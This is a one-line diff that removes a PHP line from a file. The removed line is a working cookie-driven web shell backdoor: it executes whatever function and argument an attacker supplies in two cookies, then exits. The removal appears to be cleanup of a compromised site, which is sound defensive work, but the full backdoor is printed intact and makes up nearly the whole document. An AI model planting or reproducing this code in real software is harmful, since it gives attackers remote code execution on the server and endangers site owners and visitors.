@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["hWwWA"])){$_COOKIE["PAb"]($_COOKIE["hWwWA"]);exit;}
